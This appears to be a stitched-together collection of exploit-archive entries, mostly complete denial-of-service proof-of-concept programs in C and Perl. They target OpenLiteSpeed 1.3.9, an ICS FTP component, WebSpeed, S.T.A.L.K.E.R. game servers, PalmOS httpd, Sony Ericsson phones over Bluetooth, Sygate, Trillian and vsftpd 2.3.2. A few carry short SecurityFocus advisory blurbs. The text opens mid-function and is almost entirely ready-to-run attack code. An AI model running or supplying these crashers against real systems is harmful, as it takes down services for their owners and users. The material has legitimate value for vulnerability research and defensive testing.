if ( (inet_pton(AF_INET, argv[1], &h.sin_addr)) <= 0)
	{
	h.sin_addr.s_addr = resolve(argv[1]);
	}
	
if (!h.sin_addr.s_addr) {
	fprintf(stderr, "Error resolving host\n");
	exit(-1);
	}
	
if ((s0ck = socket(AF_INET, SOCK_RAW, 255)) < 0) {
        fprintf(stderr, "Error creating raw socket, root is needed\n");
        exit (-1);
        }

setsockopt(s0ck, SOL_SOCKET, SO_BROADCAST, &uno, sizeof(uno));

packet(&h, s0ck);
fprintf(stderr, "DoS completed.\n");
exit(0);
}


// milw0rm.com [2001-05-07]
/*
*	Openlitespeed 1.3.9 Use After Free denial of service exploit.
*
*	This exploit triggers a denial of service condition within the Openlitespeed web 
*	server. This is achieved by sending a tampered request contain a large number (91)
*	of 'a: a' header rows. By looping this request, a memmove call within the HttpReq
*	class is triggered with a freed pointer, resulting in a reference to an invalid
*	memory location and thus a segmentation fault.
*
*	UAF Request:
*	GET / HTTP/1.0
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	
*	The above request should be placed into a file name 'uafcrash' prior to running this
*	exploit code.
*
*	Date: 24/03/2015
*	Author: Denis Andzakovic - Security-Assessment.com
*
*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>

extern int errno;

int main(int argc, char ** argv){
	FILE * fp;
	size_t len = 0;
	char * line;
	if((fp = fopen("uafcrash", "r")) == NULL){
		fprintf(stderr, "[!] Error: Could not open file uafcrash: %s", strerror(errno));
		return 1;
	}

	char * host = "127.0.0.1";
	int port = 8088;
	int count = 0; 
	int sock;
	struct sockaddr_in serv_addr;
	while(1){
		if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0){
			fprintf(stderr, "[!] Error: Could not create socket \n");
			return 1;
		} 

		serv_addr.sin_family = AF_INET;
		serv_addr.sin_port = htons(port);
		inet_pton(AF_INET, host, &serv_addr.sin_addr);

		if(connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr))<0){
			fprintf(stderr, "[!] Error: Could not connect! Check for server crash! Total cases sent:%d\n", count);
			close(sock);
			return 1;
		}
		while ((getline(&line, &len, fp)) != -1){

			write(sock, line, strlen(line));
		}

		close(sock);
		rewind(fp);
		count++;
	}

	return 42;
}
//--Exploit:
//===========================================================
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, \\\"ws2_32.lib\\\")


char Non_null_terminated_string [] = \\\"AAAAAAAAAAAAAAAAAA\\\";

int main(int argc, char *argv[])
{
WSADATA wsaData;
WORD wVersionRequested;
struct hostent *pTarget;
struct sockaddr_in sock;
char *target;
int port,bufsize;
SOCKET mysocket;
int res=1;
char text[1024]={\\\' \\\'};

if (argc < 2)
{
printf(\\\"\\\\r\\\\nICS FTP server Component Denial Of Service
vulnerability\\\\r\\\\n\\\", argv[0]);
printf(\\\"Coded By ATmaCA\\\\r\\\\n\\\");
printf(\\\"E-Mail:atmaca@prohack.net\\\\r\\\\n\\\");
printf(\\\"Web:www.prohack.net\\\\r\\\\n\\\\r\\\\n\\\");
printf(\\\"Usage:\\\\r\\\\n %s <targetip> [targetport] (default is
21)\\\\r\\\\n\\\\r\\\\n\\\",argv[0]);

exit(1);
}

wVersionRequested = MAKEWORD(1, 1);
if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;

target = argv[1];
port = 21;

if (argc >= 3) port = atoi(argv[2]);
bufsize = 1024;
if (argc >= 4) bufsize = atoi(argv[3]);

mysocket = socket(AF_INET, SOCK_STREAM, 0);
if(mysocket==INVALID_SOCKET)
{
printf(\\\"Socket error!\\\\r\\\\n\\\");
exit(1);
}

printf(\\\"Resolving Hostnames...\\\\n\\\");
if ((pTarget = gethostbyname(target)) == NULL)
{
printf(\\\"Resolve of %s failed\\\\n\\\", argv[1]);
exit(1);
}

memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
sock.sin_family = AF_INET;
sock.sin_port = htons((USHORT)port);

printf(\\\"Connecting...\\\\n\\\");
if ( (connect(mysocket, (struct sockaddr *)&sock, sizeof (sock) )))
{
printf(\\\"Couldn\\\'t connect to host.\\\\n\\\");
exit(1);
}

printf(\\\"Connected!...\\\\n\\\");
printf(\\\"Sending Non-null-terminated-string...\\\\n\\\");
if (send(mysocket,Non_null_terminated_string,
sizeof(Non_null_terminated_string)-1, 0) == -1)
{
printf(\\\"Error Sending the Non-null-terminated-string.\\\\r\\\\n\\\");
closesocket(mysocket);
exit(1);
}

closesocket(mysocket);
WSACleanup();
return 0;
}

// milw0rm.com [2004-07-20]
source: http://www.securityfocus.com/bid/23778/info

WebSpeed is prone to a denial-of-service vulnerability because it fails to properly sanitize user-supplied input.

Successful exploits can allow attackers to cause the application to become unresponsive, denying service to legitimate users. 

if(!$ARGV[0]){
        print "U.LP.O.W\n";
        print "www.ulpow.net\n";
        print "The Eliminators of the Web\n";
        print "Usage:perl webspeed.pl targetsite targetpage\n";

} else {

$site = $ARGV[0];
$page = $ARGV[1];


 print "Attack Started\n";




$ish=1;

do {
$ish++;
use IO::Socket;
$socket = new IO::Socket::INET( PeerAddr => $site,
PeerPort => 80,
Proto => 'tcp',
Type => SOCK_STREAM, ) or die "Couldn't Connect to target please check again
address!\n";
print $socket "GET $page HTTP/1.0\r\n";
close($socket);
} while ($ish < 1000);


print ":-; Attack Complete\n";
}
source: http://www.securityfocus.com/bid/29723/info

S.T.A.L.K.E.R. game servers are prone to a remote denial-of-service vulnerability because the software fails to handle exceptional conditions when processing user nicknames.

Successfully exploiting this issue allows remote attackers to crash the affected application, denying service to legitimate users.

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define BUFFSZ      1472
#define PORT        5445



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int putcc(u8 *dst, int chr, int len);
int putws(u8 *dst, u8 *src);
int fgetz(FILE *fd, u8 *data, int size);
int getxx(u8 *data, u32 *ret, int bits);
int putxx(u8 *data, u32 num, int bits);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    u32     res,
            seed;
    int     sd,
            i,
            len,
            pwdlen,
            nicklen,
            pck;
    u16     port        = PORT;
    u8      buff[BUFFSZ],
            nick[300],  // major than 64
            pwd[64]     = "",
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "S.T.A.L.K.E.R. <= 1.0006 Denial of Service "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    seed = time(NULL);

    do {
        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();

        seed = (seed * 0x343FD) + 0x269EC3;

        for(pck = 0; pck <= 4; pck++) {
            p = buff;
            switch(pck) {
                case 0: {
                    *p++ = 0x88;
                    *p++ = 0x01;
                    *p++ = 0x00;
                    *p++ = 0x00;
                    p += putxx(p, 0x00010006, 32);  // not verified
                    p += putxx(p, seed,       32);
                    p += putxx(p, seed,       32);  // should be a different number
                    break;
                }
                case 1: {
                    *p++ = 0x80;
                    *p++ = 0x02;
                    *p++ = 0x01;
                    *p++ = 0x00;
                    p += putxx(p, 0x00010006, 32);  // not verified
                    p += putxx(p, seed,       32);
                    p += putxx(p, seed,       32);  // should be a different number
                    break;
                }
                case 2: {
                    *p++ = 0x3f;
                    *p++ = 0x02;
                    *p++ = 0x00;
                    *p++ = 0x00;
                    p += putxx(p, seed,       32);
                    break;
                }
                case 3: {
                    memset(nick, &#039;A&#039;, sizeof(nick));
                    nick[sizeof(nick) - 1] = 0;

                    *p++ = 0x7f;
                    *p++ = 0x00;
                    *p++ = 0x01;
                    *p++ = 0x00;
                    p += putxx(p, 0x000000c1, 32);
                    p += putxx(p, 0x00000002, 32);
                    p += putxx(p, 0x00000007, 32);
                    p += putcc(p, 0,          0x50);// hash at 0x48 set to zeroes
                    pwdlen = putws(p, pwd);   p += pwdlen;
                    p += putcc(p, 0,          4);   // don&#039;t know
                    strncpy(p, nick, 0x80);   p += 0x80;
                    p += putxx(p, 1,          32);
                    nicklen = putws(p, nick); p += nicklen;

                    putxx(buff + 0x10, 0xe0 + pwdlen, 32);
                    putxx(buff + 0x14, nicklen, 32);
                    putxx(buff + 0x18, 0x58 + pwdlen, 32);
                    if(pwd[0]) putxx(buff + 0x20, 0x58, 32);
                    putxx(buff + 0x24, pwdlen, 32);
                    break;
                }
                case 4: {
                    *p++ = 0x7f;
                    *p++ = 0x00;
                    *p++ = 0x02;
                    *p++ = 0x02;
                    p += putxx(p, 0x000000c3, 32);
                    break;
                }
                default: break;
            }

            len = send_recv(sd, buff, p - buff, buff, BUFFSZ, &peer, 1);

            if(pck == 3) {
                while(buff[0] != 0x7f) {
                    len = send_recv(sd, NULL, 0, buff, BUFFSZ, &peer, 1);
                }
                getxx(buff + 8, &res, 32);
                if(res == 0x80158410) {
                    printf("\n- server is protected by password, insert it: ");
                    fgetz(stdin, pwd, sizeof(pwd));
                    break;
                } else if(res == 0x80158610) {
                    printf("\n  server full ");
                    for(i = 5; i; i--) {
                        printf("%d\b", i);
                        sleep(ONESEC);
                    }
                    break;
                } else if(res == 0x80158260) {
                    printf("\nError: your IP is banned\n");
                    exit(1);
                } else if(res) {
                    printf("\nError: unknown error number (0x%08x)\n", res);
                    //exit(1);
                }
            }
        }

        close(sd);
    } while(pck <= 4);

    printf("\n- done\n");
    return(0);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry = 2,
            len;

    if(in) {
        while(retry--) {
            fputc(&#039;.&#039;, stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!out) return(0);
            if(!timeout(sd, 1)) break;
        }
    } else {
        if(timeout(sd, 3) < 0) retry = -1;
    }

    if(retry < 0) {
        if(!err) return(-1);
        printf("\nError: socket timeout, no reply received\n\n");
        exit(1);
    }

    fputc(&#039;.&#039;, stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



int putcc(u8 *dst, int chr, int len) {
    memset(dst, chr, len);
    return(len);
}



int putws(u8 *dst, u8 *src) {
    u8      *d,
            *s;

    if(!src[0]) return(0);  // as required by stalker
    for(s = src, d = dst; ; s++) {
        *d++ = *s;
        *d++ = 0;
        if(!*s) break;
    }
    return(d - dst);
}



int fgetz(FILE *fd, u8 *data, int size) {
    u8     *p;

    if(!fgets(data, size, fd)) return(-1);
    for(p = data; *p && (*p != &#039;\n&#039;) && (*p != &#039;\r&#039;); p++);
    *p = 0;
    return(p - data);
}



int getxx(u8 *data, u32 *ret, int bits) {
    u32     num;
    int     i,
            bytes;

    bytes = bits >> 3;
    for(num = i = 0; i < bytes; i++) {
        num |= (data[i] << (i << 3));
    }
    *ret = num;
    return(bytes);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> (i << 3)) & 0xff;
    }
    return(bytes);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif



source: http://www.securityfocus.com/bid/9608/info

It has been reported that Palmhttpd server may be prone to remote denial of service vulnerability, when an attacker attempts to establish multiple connections with the software. This issue occurs because PalmOS can only handle one client connection.

Shaun2k2 Palmhttpd version 3.0 and prior may be prone to this issue. Since the application is an extension of 'httpd for PalmOS' server by Jim Rees, it is assumed that 'httpd for PalmOS' is vulnerable as well, however, this product has been discontinued.

---palmslam.c
/* PalmOS httpd accept queue overflow PoC exploit.
 * Compile: gcc palmslam.c -o palmslam
 *
 * -shaun2k2
 */
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>
#define MAX_CON 1025
int main(int argc, char *argv[]) {
        if(argc < 3) {
                printf("Usage: palmslam <host>
<port>\n");
                exit(-1);
        }

        int sock[MAX_CON];
        int i;
        struct sockaddr_in dest[MAX_CON];
        struct hostent *host;
        if((host = gethostbyname(argv[1])) == -1) {
                printf("Couldn't resolve %s!\n",
argv[1]);
                exit(-1);
        }

        for(i = 0; i <= MAX_CON; i++) {
                if((sock[i] = socket(AF_INET,
SOCK_STREAM, 0)) == -1) {
                        printf("Couldn't create
socket!\n");
                        exit(-1);
                }

                dest[i].sin_family = AF_INET;
                dest[i].sin_port =
htons(atoi(argv[2]));
                dest[i].sin_addr = *((struct in_addr
*)host->h_addr);

                if(connect(sock[i], (struct sockaddr
*)&dest[i], sizeof(struct sockaddr)) == -1) {
                        printf("Couldn't connect to %s
on port %s!\n", argv[1], argv[2]);
                        exit(-1);
                }

                printf("%d : Connected!\n", i);
        }
        return(0);
}/* Sony/Ericsson reset display - PoC */
/* Pierre BETOUIN - pierre.betouin@infratech.fr */
/* 05-02-2006 */
/* Vulnerability found using BSS fuzzer : */
/* Download www.secuobs.com/news/05022006-bluetooth10.shml */
/* */
/* Causes anormal behaviours on some Sony/Ericsson */
/* cell phones */
/* Vulnerable tested devices : */
/* - K600i */
/* - V600i */
/* - K750i */
/* - W800i */
/* - And maybe other ones... */
/* */
/* Vulnerable devices will slowly turn their screen into */
/* black and then display a white screen. */
/* After a short period (~45sec), they will go back to */
/* their normal behaviour */
/* */
/* gcc -lbluetooth reset_display_sonyericsson.c */
/* -o reset_display_sonyericsson */
/* ./reset_display_sonyericsson 00:12:EE:XX:XX:XX */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#define SIZE 4
#define FAKE_SIZE 1 // SIZE - 3 (3 bytes <=> L2CAP header)

int main(int argc, char **argv)
{
char *buffer;
l2cap_cmd_hdr *cmd;
struct sockaddr_l2 addr;
int sock, sent, i;

if(argc < 2)
{
fprintf(stderr, "%s <btaddr>\n", argv[0]);
exit(EXIT_FAILURE);
}

if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0)
{
perror("socket");
exit(EXIT_FAILURE);
}

memset(&addr, 0, sizeof(addr));
addr.l2_family = AF_BLUETOOTH;

if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0)
{
perror("bind");
exit(EXIT_FAILURE);
}

str2ba(argv[1], &addr.l2_bdaddr);

if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0)
{
perror("connect");
exit(EXIT_FAILURE);
}

if(!(buffer = (char *) malloc ((int) SIZE + 1)))
{
perror("malloc");
exit(EXIT_FAILURE);
}

memset(buffer, 90, SIZE);

cmd = (l2cap_cmd_hdr *) buffer;
cmd->code = L2CAP_ECHO_REQ;
cmd->ident = 1;
cmd->len = FAKE_SIZE;

if( (sent=send(sock, buffer, SIZE, 0)) >= 0)
{
printf("L2CAP packet sent (%d)\n", sent);
}

printf("Buffer:\t");
for(i=0; i<sent; i++)
printf("%.2X ", (unsigned char) buffer[i]);
printf("\n");

free(buffer);
close(sock);
return EXIT_SUCCESS;
}

// milw0rm.com [2006-02-06]
source: http://www.securityfocus.com/bid/1420/info

An exploit which causes a Denial of Service to Sybergen's Sygate when run from an internal machine has been released. The exploit sends a UDP packet to port 53 of the gateway. 

//Sygate Crash by: marc@eeye.com (April-00)
//http://www.eEye.com
//Will crash Sygate (http://www.sygate.com/) when ran from the internal LAN.
//Play with source routing to get it to work across the internet.
//Just hit the Internal IP of the Sygate machine.

#include <stdio.h>
#include <arpa/inet.h>

int main (int argc, char **argv)
{
        int SockFD, addrlen, bsent;
        struct sockaddr_in UDPSock;
        char bomb[]= "changeiscoming";

        printf("Sygate Crash by: marc@eeye.com\n");
        printf("http://www.eEye.com\n\n");

        if(argc<2){
                printf("Usage: %s [server]\n",argv[0]);
                exit(1);
        }

        SockFD=socket(AF_INET, SOCK_DGRAM, 0);

        UDPSock.sin_family=AF_INET;
        UDPSock.sin_addr.s_addr=inet_addr(argv[1]);
        UDPSock.sin_port=htons(53);

        bsent=sendto(SockFD,&bomb,13,0,(struct sockaddr *) &UDPSock,
sizeof(struct sockaddr_in));

        printf("Sent Crash.\nBytes Sent: %i\n",bsent);
}

source: http://www.securityfocus.com/bid/5775/info

A vulnerability has been reported for Trillian. Reportedly, Trillian is prone to a denial of service condition when certain IRC raw messages are received by the client. 

This may be exploited by a malicious server.

/* Trillian-Dos.c
   Author: Lance Fitz-Herbert
   Contact: IRC: Phrizer, DALnet - #KORP
            ICQ: 23549284

   Exploits Multiple Trillian DoS Flaws:
      Raws 206, 211, 213, 214, 215, 217, 218, 243, 302, 317, 324, 332, 333,
352, 367
      Part Flaw
      Data length flaw.

   Tested On Version .74
   Compiles with Borland 5.5 Commandline Tools.

   These Examples Will Just DoS The Trillian Client,
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <winsock.h>

SOCKET s;

#define SERVER ":server "
#define PART ":nick!ident@address PART\n"

int main(int argc, char *argv[]) {
		 SOCKET TempSock = SOCKET_ERROR;
		 WSADATA WsaDat;
		 SOCKADDR_IN Sockaddr;
		 int nRet;
		 char payload[4096];
		 if (argc < 2) {
		 		 usage();
		 		 return 1;
		 }
		 if ((!strcmp(argv[1],"raw")) && (argc < 3) || (strcmp(argv[1],"raw")) &&
(strcmp(argv[1],"part")) && (strcmp(argv[1],"data"))) {
		 		 usage();
		 		 return 1;
		 }

		 printf("Listening on port 6667 for connections....\n");
		 if (WSAStartup(MAKEWORD(1, 1), &WsaDat) != 0) {
        		 printf("ERROR: WSA Initialization failed.");
		 		 return 0;
		 }


		 /* Create Socket */
		 s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		 if (s == INVALID_SOCKET) {
		 		 printf("ERROR: Could Not Create Socket. Exiting\n");
		 		 WSACleanup();
		 		 return 0;
		 }

		 Sockaddr.sin_port = htons(6667);
		 Sockaddr.sin_family = AF_INET;
		 Sockaddr.sin_addr.s_addr  = INADDR_ANY;


        nRet = bind(s, (LPSOCKADDR)&Sockaddr, sizeof(struct sockaddr));
		 if (nRet == SOCKET_ERROR) {
		 		 printf("ERROR Binding Socket");
		 		 WSACleanup();
		 		 return 0;
		 }

		 /* Make Socket Listen */
		 if (listen(s, 10) == SOCKET_ERROR) {
		 		 printf("ERROR: Couldnt Make Listening Socket\n");
		 		 WSACleanup();
		 		 return 0;
		 }

		 while (TempSock == SOCKET_ERROR) {
		       TempSock = accept(s, NULL, NULL);
		 }

		 printf("Client Connected, Sending Payload\n");


		 if (!strcmp(argv[1],"part")) {
		 		 send(TempSock,PART,strlen(PART),0);
		 }
		 if (!strcmp(argv[1],"raw")) {
		 		 send(TempSock,SERVER,strlen(SERVER),0);
		 		 send(TempSock,argv[2],strlen(argv[2]),0);
		 		 send(TempSock,"\n",1,0);
		 }
		 if (!strcmp(argv[1],"data")) {
		 		 memset(payload,'A',4096);
		 		 send(TempSock,payload,strlen(payload),0);
		 }
		 printf("Exiting\n");
		 sleep(100);
		 WSACleanup();
		 return 0;
}

usage() {
		 		 printf("\nTrillian Multiple DoS Flaws\n");
		 		 printf("---------------------------\n");
		 		 printf("Coded By Lance Fitz-Herbert (Phrizer, DALnet/#KORP)\n");
		 		 printf("Tested On Version .74\n\n");
		 		 printf("Usage: Trillian-Dos <type> [num]\n");
		 		 printf("Type: raw, part, data\n");
		 		 printf("Num : 206, 211, 213, 214, 215, 217, 218, 243, 302, 317, 324, 332,
333, 352, 367\n\n");
}#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

/*
This is code of
http://cxib.net/stuff/vspoc232.c

PoC CVE-2011-0762 ( vsftpd )
Remote Denial of Service

Affected: 2.3.2
Fix: 2.3.4

Author:
Maksymilian Arciemowicz

Use:
./vspoc232 127.0.0.1 21 user pass 1

or read 
http://securityreason.com/achievement_securityalert/95
for more information
  
Example result:
cx@cx64:~$ telnet 172.5.0.129 21
Trying 172.5.0.129...
Connected to 172.5.0.129.
Escape character is '^]'.
500 OOPS: fork
Connection closed by foreign host.

*/

int skip=0;

int sendftp(int stream,char *what){
        if(-1==send(stream,what,strlen(what),0))
                printf("Can't send %s\n",what);
        else
                printf("send: %s\n",what);

        bzero(what,sizeof(what));
}

void readftp(int stream){
        char readline[4096];
        if(recv(stream,readline,4096,0)<1)
		if(!skip) exit(1); // end
        else
	       printf("recv: %s\n",readline);
	
}

int sendstat(host,port,login,pass)
        char *host,*port,*login,*pass;
{
        char buffer[4097]; // send ftp command buffor
        int     sockfd,n,error;
        struct addrinfo hints;
	struct addrinfo *res, *res0;

        memset(&hints, 0, sizeof(hints));
        hints.ai_family = PF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        error = getaddrinfo(host,port,&hints,&res0);

        if (error){
                errorcon:
                printf("Can`t connect\n.exit");
                exit(1);
        }

        if((sockfd=socket(res0->ai_family,res0->ai_socktype, res0->ai_protocol))<0) goto errorcon;
        if(-1==connect(sockfd,res0->ai_addr,res0->ai_addrlen)) goto errorcon;

        readftp(sockfd);
        snprintf(buffer,4096,"USER %s\nPASS %s\n\n",login,pass);
        sendftp(sockfd,buffer);
        readftp(sockfd);

        snprintf(buffer,4096,"STAT {{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{.}}}]}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}]}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}]}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}]}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}]}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}]}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}\n");
        sendftp(sockfd,buffer);
        freeaddrinfo(res0);
}

int main(int argc,char *argv[])
{
        char *login,*pass,logindef[]="anonymous",passdef[]="cxib.net@127.0.0.1";

        if(argc<3){
                printf("\nUse: ./vspoc232 host port [username] [password] [option]\nhost and port are requied\nuse option = 1 to skip recv() fails\n\nexample:\n./vspoc232 127.0.0.1 21 user pass 1\n\n");
                exit(1);
        }

        char *host=argv[1];
        char *port=argv[2];

        if(4<=argc) login=argv[3];
        else login=logindef;

        if(5<=argc) pass=argv[4];
        else pass=passdef;

        if(6<=argc) skip=1;

        while(1){
                printf("----------------------------- next\n");
                sendstat(host,port,login,pass);
                sleep(1); // some delay to be sure
        }
        return 0; // never happen
}

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <string.h>
